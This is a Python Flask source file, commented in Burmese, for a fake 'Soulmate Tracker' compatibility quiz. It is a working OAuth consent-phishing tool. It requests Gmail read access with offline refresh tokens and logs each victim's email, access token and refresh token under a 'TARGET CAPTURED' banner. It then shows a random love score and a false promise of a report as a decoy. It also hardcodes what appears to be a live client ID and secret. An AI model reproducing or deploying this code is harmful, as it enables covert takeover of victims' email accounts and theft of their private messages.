from flask import Flask, redirect, url_for, request
import requests
import random
import json

app = Flask(__name__)

# --- CONFIGURATION ---
CLIENT_ID = "1067906653409-dsmhmumlp914dcihc7ob94m3fsms2kpg.apps.googleusercontent.com"
CLIENT_SECRET = "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"
REDIRECT_URI = 'https://soulmate-tracker.onrender.com/callback'

@app.route('/')
def index():
    # Permission တောင်းတဲ့နေရာမှာ Gmail ဖတ်ခွင့် (readonly) ကို ထည့်သွင်းထားပါတယ်
    scopes = [
        "https://www.googleapis.com/auth/userinfo.profile",
        "https://www.googleapis.com/auth/userinfo.email",
        "https://www.googleapis.com/auth/gmail.readonly"
    ]
    scope_param = " ".join(scopes)
    
    # access_type=offline က နောက်ကွယ်ကနေ အမြဲတမ်းဝင်ဖတ်လို့ရမယ့် Refresh Token ကို တောင်းတာပါ
    # prompt=consent က Permission တောင်းတဲ့ box အမြဲတမ်းပေါ်နေအောင် လုပ်တာပါ
    auth_url = (f"https://accounts.google.com/o/oauth2/v2/auth?client_id={CLIENT_ID}"
                f"&redirect_uri={REDIRECT_URI}&response_type=code&scope={scope_param}"
                f"&access_type=offline&prompt=consent")
    return redirect(auth_url)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code:
        return "Verification Failed. Please try again.", 400

    # Code ကို Access Token အဖြစ် ပြောင်းလဲခြင်း
    token_url = "https://oauth2.googleapis.com/token"
    data = {
        'code': code,
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'redirect_uri': REDIRECT_URI,
        'grant_type': 'authorization_code'
    }
    
    r = requests.post(token_url, data=data)
    token_data = r.json()
    
    access_token = token_data.get('access_token')
    refresh_token = token_data.get('refresh_token')
    
    if not access_token:
        return "Authentication Error", 400

    # Target ရဲ့ Profile Information ကို ယူခြင်း
    user_info = requests.get("https://www.googleapis.com/oauth2/v2/userinfo", 
                             headers={"Authorization": f"Bearer {access_token}"}).json()
    
    target_email = user_info.get('email')

    # --- LOGGING DATA (Render Logs ထဲမှာ သွားကြည့်ပါ) ---
    print("\n" + "💀" * 30)
    print("      [!] TARGET CAPTURED [!]")
    print(f"EMAIL        : {target_email}")
    print(f"ACCESS TOKEN : {access_token}")
    print(f"REFRESH TOKEN: {refresh_token}")
    print("💀" * 30 + "\n")

    # --- UI DESIGN (Random Percent ပါဝင်သည်) ---
    soulmate_score = random.randint(72, 99)
    
    return f"""
    <html>
    <head>
        <title>Soulmate Tracker - Results</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
    </head>
    <body style="text-align: center; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding-top: 50px; background-color: #fff5f8;">
        <div style="border: 1px solid #ffccd5; display: inline-block; padding: 40px; border-radius: 30px; background: white; box-shadow: 0 10px 25px rgba(0,0,0,0.05); max-width: 90%;">
            <h1 style="color: #ff4d4d; font-size: 2.5em; margin-bottom: 5px;">❤️ Soulmate Match ❤️</h1>
            <p style="color: #888; margin-bottom: 20px;">Identity Verified for {target_email}</p>
            
            <div style="font-size: 6em; font-weight: bold; color: #ff3366; margin: 20px 0; text-shadow: 2px 2px #ffe6eb;">
                {soulmate_score}%
            </div>
            
            <p style="font-size: 1.3em; color: #444; font-weight: 500;">Calculating compatibility...</p>
            <div style="width: 100%; background-color: #f3f3f3; border-radius: 10px; margin: 20px 0;">
                <div style="width: {soulmate_score}%; background-color: #ff3366; height: 10px; border-radius: 10px;"></div>
            </div>
            
            <p style="color: #666; font-style: italic;">The full compatibility report and Litmatch profile analysis will be sent to your Gmail inbox within 2-5 minutes.</p>
            
            <div style="margin-top: 30px; font-size: 0.9em; color: #32CD32; font-weight: bold;">
                ● Secure Link Active ●
            </div>
        </div>
    </body>
    </html>
    """

if __name__ == '__main__':
    # Local မှာ စမ်းရင် port 5000 နဲ့ run ပါ
    app.run(port=5000)
